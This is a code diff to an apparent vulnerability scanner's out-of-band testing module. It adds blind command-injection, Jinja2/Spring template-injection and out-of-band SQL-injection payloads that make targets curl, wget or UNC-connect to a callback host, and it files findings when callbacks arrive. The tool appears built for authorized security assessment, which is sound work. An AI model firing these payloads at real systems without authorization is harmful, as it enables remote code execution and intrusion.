@@ -151,15 +151,44 @@ def _xxe_endpoints(inventory: list[dict]) -> list[str]:
     return out
 
 
+def _class_params(inventory, cls):
+    """(url, param, method) tuples whose param classifies to `cls`."""
+    out = []
+    for it in inventory:
+        for p in (it.get("params") or []):
+            if cls in classify_param(p):
+                out.append({"url": it["url"], "param": p, "method": (it.get("method") or "GET").upper()})
+    return out
+
+
+def _cmd_payloads(url):
+    """OS-command / template-injection payloads that fetch our callback URL over HTTP
+    (works for both interactsh and the tunnel)."""
+    return [f"1;curl -s {url}", f"1|curl -s {url}", f"1$(curl -s {url})",
+            f"1`curl -s {url}`", f"1&&curl -s {url}", f"1;wget -qO- {url}",
+            f"${{T(java.lang.Runtime).getRuntime().exec('curl {url}')}}",       # Spring/Java SSTI
+            "{{cycler.__init__.__globals__.os.popen('curl " + url + "').read()}}"]  # Jinja2 SSTI
+
+
+def _sqli_oob_payloads(url, host):
+    """Out-of-band SQL-injection payloads (DB-specific). UNC/DNS variants need interactsh
+    (DNS); the UTL_HTTP variant works over HTTP on the tunnel too. Best-effort."""
+    return [f"' OR UTL_HTTP.REQUEST('{url}')='",                         # Oracle
+            f"';EXEC master..xp_dirtree '\\\\{host}\\a';--",       # MSSQL UNC
+            f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{host}\\\\a'))-- -"]  # MySQL UNC
+
+
 def oast_scan(assessment_id, inventory, sandbox, session_headers, cfg,
               log: Callable[[str], None] = lambda m: None) -> int:
     """Inject tokenised OAST payloads into SSRF/URL sinks and XXE-capable endpoints, wait,
     then auto-file the blind findings that called back. Returns the count filed/flagged."""
+    from owlforge.engine.classify import RCE, SQLI, SSTI
     from owlforge.engine.preprobe import _send
-
     ssrf_t = _ssrf_targets(inventory)
     xxe_e = _xxe_endpoints(inventory)
-    if not ssrf_t and not xxe_e:
+    cmd_t = _class_params(inventory, RCE) + _class_params(inventory, SSTI)
+    sqli_t = _class_params(inventory, SQLI)
+    if not (ssrf_t or xxe_e or cmd_t or sqli_t):
         return 0
 
     sess = OastSession(sandbox, cfg)
@@ -208,6 +237,34 @@ def oast_scan(assessment_id, inventory, sandbox, session_headers, cfg,
         except Exception:
             continue
         pending.append({"token": tok, "kind": "xxe", "url": url, "method": "POST"})
+    # blind OS-command / template injection (HTTP callback via curl/wget)
+    seen_cmd = set()
+    for t in cmd_t[:10]:
+        key = (t["url"], t["param"])
+        if key in seen_cmd:
+            continue
+        seen_cmd.add(key)
+        tok = "owl" + _secrets.token_hex(4)
+        for payload in _cmd_payloads(sess.url(tok)):
+            try:
+                _send(sandbox, t["method"], t["url"], t["param"], payload, session_headers)
+            except Exception:
+                pass
+        pending.append({"token": tok, "kind": "cmd", **t})
+    # out-of-band SQL injection (DB-specific, best-effort)
+    seen_sqli = set()
+    for t in sqli_t[:10]:
+        key = (t["url"], t["param"])
+        if key in seen_sqli:
+            continue
+        seen_sqli.add(key)
+        tok = "owl" + _secrets.token_hex(4)
+        for payload in _sqli_oob_payloads(sess.url(tok), sess.host(tok)):
+            try:
+                _send(sandbox, t["method"], t["url"], t["param"], payload, session_headers)
+            except Exception:
+                pass
+        pending.append({"token": tok, "kind": "sqli", **t})
 
     log(f"oast: injected {len(pending)} callback payload(s) via {sess.source}; "
         f"waiting {cfg.wait_seconds}s")
@@ -218,23 +275,38 @@ def oast_scan(assessment_id, inventory, sandbox, session_headers, cfg,
     filed = 0
     for p in pending:
         if p["token"] in interactions:
+            cbk = sess.host(p["token"])
+            note = f"OAST callback confirmed via {sess.source}"
             if p["kind"] == "ssrf":
-                _file_finding(
-                    assessment_id, title=f"Blind SSRF via '{p['param']}'",
+                _file_finding(assessment_id, title=f"Blind SSRF via '{p['param']}'",
                     severity="high", endpoint=p["url"], method=p["method"],
                     analysis=(f"The target fetched an attacker-controlled URL supplied in "
-                              f"'{p['param']}' ({p['method']} {p['url']}): a callback to "
-                              f"{sess.host(p['token'])} was received (out-of-band confirmation)."),
-                    poc=f"{p['param']} = {sess.url(p['token'])} -> server-side callback received",
-                    status="validated", note=f"OAST callback confirmed via {sess.source}")
-            else:
-                _file_finding(
-                    assessment_id, title="Blind XML external entity (XXE) injection",
+                              f"'{p['param']}' ({p['method']} {p['url']}): a callback to {cbk} "
+                              "was received (out-of-band confirmation)."),
+                    poc=f"{p['param']} = {sess.url(p['token'])} -> server-side callback",
+                    status="validated", note=note)
+            elif p["kind"] == "xxe":
+                _file_finding(assessment_id, title="Blind XML external entity (XXE) injection",
                     severity="high", endpoint=p["url"], method="POST",
                     analysis=(f"An XML external entity posted to {p['url']} made the parser fetch "
-                              f"{sess.host(p['token'])} (out-of-band confirmation of XXE)."),
-                    poc=f"XML external entity -> callback to {sess.host(p['token'])}",
-                    status="validated", note=f"OAST callback confirmed via {sess.source}")
+                              f"{cbk} (out-of-band confirmation of XXE)."),
+                    poc=f"XML external entity -> callback to {cbk}", status="validated", note=note)
+            elif p["kind"] == "cmd":
+                _file_finding(assessment_id,
+                    title=f"Blind OS command / template injection via '{p['param']}'",
+                    severity="critical", endpoint=p["url"], method=p["method"],
+                    analysis=(f"A command/template payload in '{p['param']}' ({p['method']} "
+                              f"{p['url']}) executed server-side and fetched {cbk} "
+                              "(out-of-band confirmation — the server ran our command)."),
+                    poc=f"{p['param']} = ...curl {sess.url(p['token'])}... -> server-side callback",
+                    status="validated", note=note)
+            else:  # sqli
+                _file_finding(assessment_id, title=f"Blind (out-of-band) SQL injection via '{p['param']}'",
+                    severity="high", endpoint=p["url"], method=p["method"],
+                    analysis=(f"An out-of-band SQL-injection payload in '{p['param']}' ({p['method']} "
+                              f"{p['url']}) made the database contact {cbk} (OOB confirmation)."),
+                    poc=f"{p['param']} = <OOB SQLi payload> -> database callback to {cbk}",
+                    status="validated", note=note)
             filed += 1
     log(f"oast: {filed} blind finding(s) confirmed by callback" if filed
         else "oast: no callbacks received (no blind SSRF/XXE on the tested sinks)")
